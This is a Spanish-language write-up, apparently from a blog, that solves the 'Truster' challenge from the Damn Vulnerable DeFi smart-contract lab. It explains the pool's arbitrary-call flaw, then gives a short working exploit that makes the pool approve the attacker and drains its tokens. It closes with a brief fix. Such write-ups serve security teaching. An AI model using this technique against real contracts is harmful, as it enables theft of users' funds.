{"metadata":{"title":"Solucion al challenge .#3 Truster","date":"Jan 4, 2022","excerpt":"Cada dia mas lendings pools ofrecen flash loans. En este caso se ha lanzado un pool que ofrece flash loans de tokens DVT gratis. Actualmente el pool tiene un millon de tokens DVT. Tu no tienes nada. Pero no te preocupes, quizas puedas tener todo el balance del pool... en una sola transaccion"},"content":"<p>Cada dia mas lendings pools ofrecen flash loans. En este caso se ha lanzado un pool que ofrece flash loans de tokens DVT gratis.</p>\n<p>Actualmente el pool tiene un millon de tokens DVT. Tu no tienes nada :(</p>\n<p>Pero no te preocupes, quizas puedas tener todo el balance del pool... en una sola transaccion</p>\n<h2>Como funciona?</h2>\n<p>El contrato <a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/truster/TrusterLenderPool.sol\">TrusterLenderPool.sol</a> tiene una\nfuncion <code>flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data)</code> que se utiliza para realizar el flash loan, <code>borrowAmount</code> es cuanto pedis prestado\n<code>borrower</code> es quien recibe el prestamo, <code>target</code> es el contrato y en <code>data</code> se pasa la funcion y los argumentos para que se ejecute en target.</p>\n<p>Fragmento de TrusterLenderPool.sol</p>\n<pre><code class=\"hljs language-js\">    using <span class=\"hljs-title hljs-class\">Address</span> <span class=\"hljs-keyword\">for</span> address;\n\n    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title hljs-function\">flashLoan</span>(<span class=\"hljs-params\">\n        uint256 borrowAmount,\n        address borrower,\n        address target,\n        bytes calldata data\n    </span>)\n        external\n        nonReentrant\n    {\n        uint256 balanceBefore = damnValuableToken.<span class=\"hljs-title hljs-function\">balanceOf</span>(<span class=\"hljs-title hljs-function\">address</span>(<span class=\"hljs-variable hljs-language\">this</span>));\n        <span class=\"hljs-built_in\">require</span>(balanceBefore >= borrowAmount, <span class=\"hljs-string\">\"Not enough tokens in pool\"</span>);\n        \n        damnValuableToken.<span class=\"hljs-title hljs-function\">transfer</span>(borrower, borrowAmount);\n        target.<span class=\"hljs-title hljs-function\">functionCall</span>(data);\n\n        uint256 balanceAfter = damnValuableToken.<span class=\"hljs-title hljs-function\">balanceOf</span>(<span class=\"hljs-title hljs-function\">address</span>(<span class=\"hljs-variable hljs-language\">this</span>));\n        <span class=\"hljs-built_in\">require</span>(balanceAfter >= balanceBefore, <span class=\"hljs-string\">\"Flash loan hasn't been paid back\"</span>);\n    }\n</code></pre>\n<p><code>functionCall</code> es una librerira provista por OpenZeppelin, se declara en <code>using Address for address;</code>, luego se utiliza en <code>target.functionCall(data);</code>.</p>\n<p>El problema radica en que se hace una llamada externa a un contrato que puede ser malicioso y con una ejecucion de funciones y parametros arbitrarios.</p>\n<p>Esto no es la primera vez que pasa, este fue un <a href=\"https://medium.com/immunefi/zapper-arbitrary-call-data-bug-fix-postmortem-d75a4a076ae9\">caso real en zapper</a></p>\n<h2>El exploit</h2>\n<p>Bastante simple, solo hay que hacer que el contrato apruebe al atacante para hacer uso de sus tokens.</p>\n<pre><code class=\"hljs language-js\">    <span class=\"hljs-title hljs-function\">it</span>(<span class=\"hljs-string\">'Exploit'</span>, <span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {\n        <span class=\"hljs-keyword\">const</span> encodedData = <span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">token</span>.<span class=\"hljs-property\">interface</span>.<span class=\"hljs-title hljs-function\">encodeFunctionData</span>(<span class=\"hljs-string\">'approve'</span>, [attacker.<span class=\"hljs-property\">address</span>, <span class=\"hljs-variable hljs-constant\">TOKENS_IN_POOL</span>])  \n        <span class=\"hljs-keyword\">await</span> <span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">pool</span>.<span class=\"hljs-title hljs-function\">connect</span>(attacker).<span class=\"hljs-title hljs-function\">flashLoan</span>(<span class=\"hljs-number\">0</span>, <span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">pool</span>.<span class=\"hljs-property\">address</span>, <span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">token</span>.<span class=\"hljs-property\">address</span>, encodedData);\n        <span class=\"hljs-keyword\">await</span> <span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">token</span>.<span class=\"hljs-title hljs-function\">connect</span>(attacker).<span class=\"hljs-title hljs-function\">transferFrom</span>(<span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">pool</span>.<span class=\"hljs-property\">address</span>, attacker.<span class=\"hljs-property\">address</span>, <span class=\"hljs-variable hljs-constant\">TOKENS_IN_POOL</span>);\n    });\n</code></pre>\n<p>Con esto hacemos que el contrato haga una llamada a <code>token.approve(atacante, cantidadDeToknes);</code>, una vez que podemos hacer uso de los tokes del contrato los trasnferimos a nuestra cuenta y drop the mic.</p>\n<h2>Como solucionarlo?</h2>\n<p>Bastaria con evitar que el usuario haga una llamada arbitraria.</p>"}